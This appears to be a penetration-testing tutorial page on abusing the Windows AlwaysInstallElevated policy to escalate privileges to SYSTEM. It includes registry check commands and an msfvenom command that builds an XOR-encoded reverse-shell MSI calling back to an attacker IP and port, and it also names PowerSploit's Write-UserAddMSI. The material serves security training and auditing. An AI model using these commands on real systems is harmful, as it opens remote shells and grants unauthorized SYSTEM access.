A functionality that allows a regular user to install MSI files with high privileges.

Windows environments provide a group policy settings which allow a regular user to install a Microsoft Windows Installer Package (MSI) with system privileges. This can be discovered in environments where a standard users wants to install an application which requires system privileges and the administrator would like to avoid to give temporary local administrator access to a user.

From the security point of view this can be abused by an attacker in order to escalate his privileges to the box to SYSTEM.

AlwaysInstallElevated is a functionality that offers all users(especially low-privileged user) on a windows machine to run any MSI file with elevated privileges. MSI is a Microsoft based installer package file format which is used for installing storing and removing of a program.

Here is an Example on how to check for this functionality. This is the manual way, there al Metasploit Modules and Powershell scripts that can search for these, but here we will use SharpUp a Vulnerability check that is similar to PowerUp but in C# code.

## Reg Check

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
```

![](https://dmcxblue.gitbook.io/~gitbook/image?url=https%3A%2F%2F244509215-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-Lx2b2zLkTKHrsGfxMoR%252F-LzYDP-XfEjPXc0sY0gB%252F-LzYFqeWeNKfxr8aDsGN%252Fimage.png%3Falt%3Dmedia%26token%3D543c5dc2-b746-406a-a5eb-7e1d26a25945&width=768&dpr=4&quality=100&sign=e3a4afae171c4672a9f6dfa752530a382d076a5d61ac744d7f3d446576756355)

## SharpUp audit

![](https://dmcxblue.gitbook.io/~gitbook/image?url=https%3A%2F%2F244509215-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-Lx2b2zLkTKHrsGfxMoR%252F-LzYG4CJMbXwAEhq5pXs%252F-LzYHeozYT580-o3i3aa%252Fimage.png%3Falt%3Dmedia%26token%3D4911d0e0-d889-4ca4-81d1-2be0b90de0c6&width=768&dpr=4&quality=100&sign=51ed6d9194d19e3d562780c7c7fc42bf3db3b04d00931c49b5cccf23fccedf6a)

So how do we move from here, we will need to simply create an MSI file that can connect back to our attacker machine. I will create simply binary using msfvenom.

## MSFVenom

```
msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi
```

## PowerSploit Method

```
Write-UserAddMSI
```
